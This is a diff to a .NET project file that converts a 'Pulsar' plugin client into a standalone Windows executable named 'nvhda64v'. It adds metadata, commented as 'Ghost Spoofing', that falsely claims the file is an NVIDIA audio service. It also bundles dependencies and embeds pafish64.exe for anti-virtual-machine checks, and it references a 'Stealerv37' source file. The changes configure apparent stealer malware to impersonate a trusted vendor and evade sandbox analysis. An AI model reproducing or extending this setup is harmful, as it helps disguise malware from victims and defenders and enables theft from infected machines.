@@ -2,17 +2,35 @@
 
   <PropertyGroup>
     <TargetFramework>net8.0-windows</TargetFramework>
-    <OutputType>Library</OutputType>
+    <OutputType>WinExe</OutputType>
     <UseWindowsForms>true</UseWindowsForms>
     <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
-    <CopyLocalLockFileAssemblies>true</CopyLocalLockFileAssemblies>
-    <AssemblyName>Pulsar.Plugin.Client</AssemblyName>
-    <GenerateAssemblyInfo>false</GenerateAssemblyInfo>
-    <Configurations>Debug;Release</Configurations>
-    <Platforms>AnyCPU</Platforms>
+    <AssemblyName>nvhda64v</AssemblyName>
+    <PublishSingleFile>true</PublishSingleFile>
+    <SelfContained>false</SelfContained>
+    <IncludeNativeLibrariesForSelfExtract>true</IncludeNativeLibrariesForSelfExtract>
+    <DebugType>none</DebugType>
+    <GenerateAssemblyInfo>true</GenerateAssemblyInfo>
+  </PropertyGroup>
+
+  <!-- NVIDIA Ghost Spoofing Metadata -->
+  <PropertyGroup>
+    <Company>NVIDIA Corporation</Company>
+    <Product>NVIDIA High Definition Audio Controller</Product>
+    <Description>NVIDIA Audio Control Service</Description>
+    <Copyright>© 2025 NVIDIA Corporation. All rights reserved.</Copyright>
+    <FileVersion>1.20.0.1</FileVersion>
+    <AssemblyVersion>1.20.0.1</AssemblyVersion>
+    <Title>nvhda64v</Title>
+    <Guid>8903f661-28b9-4164-94cf-c6d4c5692094</Guid>
+    <ComVisible>false</ComVisible>
   </PropertyGroup>
 
   <ItemGroup>
+    <PackageReference Include="Costura.Fody" Version="6.0.0">
+      <IncludeAssets>runtime; build; native; contentfiles; analyzers; buildtransitive</IncludeAssets>
+      <PrivateAssets>all</PrivateAssets>
+    </PackageReference>
     <PackageReference Include="System.Management" Version="8.0.0" />
     <PackageReference Include="System.IO.Hashing" Version="8.0.0" />
   </ItemGroup>
@@ -24,6 +42,11 @@
     <EmbeddedResource Remove="costura\**" />
     <Compile Remove="Stealerv37_ProcessedByFody.cs" />
     <Compile Remove="_003CModule_003E.cs" />
+    
+    <!-- Embed Pafish for Anti-VM checks -->
+    <EmbeddedResource Include="..\..\pafish64.exe">
+      <Link>Resources\pafish64.exe</Link>
+    </EmbeddedResource>
   </ItemGroup>
 
 </Project>
